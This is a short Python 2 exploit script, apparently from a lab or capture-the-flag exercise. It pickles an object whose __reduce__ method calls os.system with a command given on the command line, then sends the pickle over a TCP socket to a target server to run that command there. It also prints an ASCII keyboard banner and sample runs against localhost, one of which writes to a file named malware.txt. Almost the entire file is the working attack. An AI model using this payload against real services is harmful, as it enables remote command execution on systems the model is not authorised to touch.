# -*- coding: utf-8 -*-
import socket
import os
import pickle
import sys

# exploit class
class my_exploit(object):
    def __init__(self,command):
        self.command = command

    def __reduce__(self):
        return (os.system,(self.command, ))

def exploit(address, port,payload):
    # create a connection tuple
    connection_tuple = (address,port)

    # create a socket client
    socket_client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    # pre-store empty container for server_hello, and output
    server_hello, command_output = 0,0

    # connect the socket client with the server
    try:
        socket_client.connect(connection_tuple)
        server_hello = socket_client.recv(1024)
    except Exception, e:
        print ("there seems to be a connection error for the client socket")
        print str(e)
    try:
        socket_client.sendall(payload)
        command_output = socket_client.recv(1024)
    except Exception, e:
        print ("there seems to be a connection error for the client socket")
        print str(e)

    return command_output

    

def main():
    # ask the user for address, port and command to be executed
    print("Welcome :) ")
    print('''
|"""""""""""""""""""""""""""""""""""""""""""""""""""""""""".---------------.""|
|                                                          |/ Shinchan1027 |  |
|                                                          |\_."A-500 Plus |  |
|mga                                                       '---------------'  |
|-----------------------------------------------------------------------------|
||Es| |F1 |F2 |F3 |F4 |F5 | |F6 |F7 |F8 |F9 |F10|                Power [____] |
||__| |___|___|___|___|___| |___|___|___|___|___|                Drive [____] |
| _____________________________________________     ________    ___________   |
||   |! |" |£ |$ |% |^ |& |* |( |) |_ |+ || |<-|   |Del|Help|  |( |) |/ |* |  |
||___|1_|2_|3_|4_|5_|6_|7_|8_|9_|0_|-_|=_|\_|__|   |___|____|  |__|__|__|__|  |
||<-  |Q |W |E |R |T |Y |U |I |O |P |{ |} |   ||               |7 |8 |9 |- |  |
||->__|__|__|__|__|__|__|__|__|__|__|[_|]_|_  ||               |__|__|__|__|  |
||Ctr|oC|A |S |D |F |G |H |J |K |L |: |@ |  |<'|               |4 |5 |6 |+ |  |
||___|_L|__|__|__|__|__|__|__|__|__|;_|'_|__|__|       __      |__|__|__|__|  |
||^    |  |Z |X |C |V |B |N |M |< |> |? |^     |      |A |     |1 |2 |3 |E |  |
||_____|__|__|__|__|__|__|__|__|__|__|__|______|    __||_|__   |__|__|__|n |  |
|   |Alt|A  |                       |A  |Alt|      |<-|| |->|  |0    |. |t |  |
|   |___|___|_______________________|___|___|      |__|V_|__|  |_____|__|e_|  |
|                                                                             |
'-----------------------------------------------------------------------------'
    
    ''')
    print("Sample Use: python exploit.py 127.0.0.1 10008 \"ls -al\"")
    ip_address = sys.argv[1]
    port = sys.argv[2]
    command = sys.argv[3]
    try:
        ip_address = str(ip_address)
        port = int(port)
        command = str(command)
    except Exception, e:
        print ("seems like one of the input is wrong :( Try Again !!")
        print(e)


    # create an instance of my_exploit, and pickle it
    exploit_object = my_exploit(command)
    payload = pickle.dumps(exploit_object)
    output = exploit(ip_address,port,payload)
    print(output)



# call the function main
main()





# command used in terminal:
# python exploit.py 127.0.0.1 10013 "echo \"auhfsoif9234824u32rhfdbsknkj\" >> malware.txt"
# exploit class